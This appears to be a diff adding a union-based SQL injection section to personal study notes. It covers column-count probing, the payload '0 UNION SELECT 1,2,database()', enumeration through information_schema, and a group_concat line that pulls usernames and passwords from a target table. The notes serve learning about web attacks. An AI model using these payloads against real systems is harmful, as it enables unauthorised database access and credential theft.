@@ -126,3 +126,31 @@ Exploits error messages that user receives.
 If database is not configured it could leak information about query structure, table names, data.
 
 Error Based Injections => reveal structual information.
+
+### Union Based SQL Injection
+
+Union Based Injection => method for extracting large amount of data.
+
+It uses UNION operator to combine custom made SELECT query to original one.
+
+UNION operator requires that two or more queries columns need to be equal.
+
+OUTPUT:
+
+`1 UNION SELECT 1          -- error (wrong column count)
+1 UNION SELECT 1,2        -- error (still wrong)
+1 UNION SELECT 1,2,3      -- success! The table has 3 columns`
+
+Change the original query value to 0 (smth that doesn't change), so the UNION output is displayed.
+
+COMMAND:
+
+`0 UNION SELECT 1,2,database()`
+
+use database command to reveal current database name.
+
+information_schema.tables => to list all tables in target database.
+
+information_schema.columns => to list all columns in target database.
+
+group_concat(username,':',password SEPARATOR '<br>') FROM target_table => to extract data
